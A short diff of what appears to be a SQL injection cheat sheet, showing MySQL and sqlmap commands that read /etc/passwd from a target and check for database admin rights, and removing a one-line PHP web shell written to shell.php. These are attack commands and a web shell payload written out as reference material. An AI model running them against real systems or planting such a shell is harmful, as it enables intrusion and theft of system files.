@@ -204,5 +204,3 @@ Command to read file : `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`
 Checking for DBA Privileges : `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`
 
 Reading Local Files : `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`
-
-`echo '<?php system($_GET["cmd"]); ?>' > shell.php`
